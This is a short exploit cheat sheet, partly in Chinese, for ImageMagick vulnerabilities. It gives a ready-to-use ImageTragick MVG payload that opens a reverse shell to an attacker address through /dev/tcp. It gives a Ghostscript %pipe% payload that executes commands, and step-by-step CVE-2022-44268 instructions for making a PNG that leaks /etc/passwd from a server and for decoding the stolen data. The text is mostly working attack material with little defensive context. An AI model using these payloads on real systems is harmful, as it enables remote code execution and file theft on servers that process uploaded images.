# ImageMagick Exploits

## ImageTragik Exploit v1

反弹shell

```powershell
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

## ImageTragik Exploit v2

Simple `id` payload

```powershell
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

然后使用 `convert shellexec.jpeg whatever.gif`


## CVE-2022-44268

信息泄露：插入任意远程文件的内容

* 生成payload
    ```ps1
    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
    ```

* 通过上传文件触发攻击。后端可能会使用类似`Convert pngout.png pngConverted.png`的内容。
* 下载转换后的图片，查看图片内容，具体方式为：`identify -verbose pngconverted.png`
* 转换过滤出的数据： `python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'` 


## 致谢

* [openwall.com/lists/oss-security/2018/08/21/2 by Tavis Ormandy](http://openwall.com/lists/oss-security/2018/08/21/2)